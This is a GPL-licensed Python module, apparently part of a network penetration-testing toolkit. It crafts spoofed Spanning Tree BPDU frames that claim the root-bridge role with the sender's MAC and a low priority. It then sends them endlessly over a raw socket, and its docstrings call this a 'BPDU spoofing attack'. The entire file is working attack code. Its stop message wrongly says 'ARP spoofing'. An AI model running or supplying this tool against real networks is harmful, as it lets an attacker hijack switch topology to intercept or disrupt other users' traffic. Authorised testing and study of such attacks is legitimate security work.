#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for BPDUPacket class"""


import socket
from struct import pack
from time import sleep
from binascii import unhexlify
import logging

from .helpers import make_valid_mac_address


_LOGGER = logging.getLogger(__name__)


class BPDUPacket:
    """A class that represents BPDU packet for BPDU spoofing attack"""

    def __init__(self, interface, srcmac, dstmac, priority=8192):
        """
        Create an initial information for BPDU Packet

        :interface: your network interface that is connected
                    to the tested network (i.e wlan0)
        :srcmac: your MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                     == bb:bb:bb:bb:bb:bb)
        :dstmac: switch MAC-address
        :priority: STP priority
        """
        self.interface = interface
        self.srcmac = make_valid_mac_address(srcmac)
        self.srcmac_str = srcmac
        self.dstmac = make_valid_mac_address(dstmac)
        if priority is None:
            priority = 8192
        self.priority = int(priority)
        if interface and srcmac and dstmac:
            _LOGGER.debug(
                "Creating an BPDU packet with your interface %s, "
                "source MAC %s and bridge MAC %s",
                self.interface,
                srcmac,
                dstmac,
            )
            self.packet = self.create_packet()

    def create_packet(self):
        """
        Create an actual BPDU packet as self.packet field

        :return: None
        """
        payload = self._create_payload()
        llc_header = b"\x42\x42\x03"
        self.header = (
            self.dstmac
            + self.srcmac
            + pack(">H", len(llc_header) + len(payload))
            + llc_header
        )
        return self.header + payload

    def send_multiple_bpdu_packets(self):
        """Send loads of BPDU packets"""
        _LOGGER.info("Running the BPDU spoofing attack. Press Ctrl+C to stop")
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((self.interface, 0))
        while True:
            try:
                sock.send(self.packet)
                sleep(2)
            except KeyboardInterrupt:
                _LOGGER.warning("Stopping ARP spoofing attack")
                break

    def _create_bridge_id(self, mac, priority):
        """
        Create a STP Bridge ID

        :mac: MAC address in aa:aa:aa:aa:aa:aa (or uppercase, or with '-')
              format
        :priority: STP priority
        :return: bridgeID in HEX format
        """
        if not 0 <= priority <= 61440:
            raise ValueError("Priority must be in range from 0 to 61440")
        if priority % 4096 != 0:
            raise ValueError("Priority must be divisible by 4096")

        # 4096 -> 1000
        converted_priority = hex(int(priority / 4096))[2] + "000"
        str_bridge_id = converted_priority + mac.replace(":", "").replace(
            "-", ""
        )
        _LOGGER.debug("Set Bridge ID %s", converted_priority + "." + mac)
        return unhexlify(str_bridge_id.strip())

    def _create_payload(self):
        """
        Return STP payload
        """
        protocol_type = b"\x00\x00\x02\x02"
        flags = b"\x7e"
        # Priority is equal to 8192
        root_id = self._create_bridge_id(self.srcmac_str, self.priority)
        path_cost = b"\x00" * 4
        bridge_id = root_id
        port_id = b"\x80\x01"
        msg_age = b"\x00\x00"
        max_age = b"\x14\x00"
        hello = b"\x02\x00"
        forward_delay = b"\x0f\x00"
        vers_len = b"\x00"

        return (
            protocol_type
            + flags
            + root_id
            + path_cost
            + bridge_id
            + port_id
            + msg_age
            + max_age
            + hello
            + forward_delay
            + vers_len
        )
